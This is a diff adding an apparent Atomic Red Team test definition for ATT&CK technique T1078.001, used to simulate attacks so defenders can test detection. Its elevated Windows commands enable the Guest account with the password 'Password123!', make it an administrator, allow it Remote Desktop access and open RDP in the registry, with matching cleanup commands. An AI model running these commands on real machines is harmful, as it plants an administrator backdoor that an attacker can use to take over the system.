@@ -1,0 +1,24 @@
+attack_technique: T1078.001
+display_name: 'Valid Accounts: Default Accounts'
+atomic_tests:
+- name: Enable Guest account with RDP capability and admin priviliges
+  auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
+  description: After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group, and desktop will allow multiple RDP connections
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      net user guest /active:yes
+      net user guest Password123!
+      net localgroup administrators guest /add
+      net localgroup "Remote Desktop Users" guest /add
+      reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+      reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
+    cleanup_command: |-
+      net user guest /active:no
+      net localgroup administrators guest /delete
+      net localgroup "Remote Desktop Users" guest /delete
+      reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f
+      reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f
+    name: command_prompt
+    elevation_required: true
